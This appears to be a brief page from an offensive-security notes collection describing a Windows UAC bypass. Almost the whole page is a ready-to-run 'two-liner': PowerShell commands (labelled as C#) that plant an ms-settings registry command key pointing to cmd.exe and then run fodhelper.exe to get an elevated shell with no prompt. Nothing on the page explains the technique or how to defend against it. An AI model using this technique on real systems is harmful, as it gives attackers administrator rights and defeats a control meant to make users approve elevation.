# UAC Bypass

## UAC bypass

### 2 liners

```csharp
New-Item -Path HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command  -Value cmd.exe -Force 
New-ItemProperty -Path HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command -Name DelegateExecute -PropertyType String -Force

fodhelper.exe
```

![](../../../../.gitbook/assets/image%20%28255%29.png)

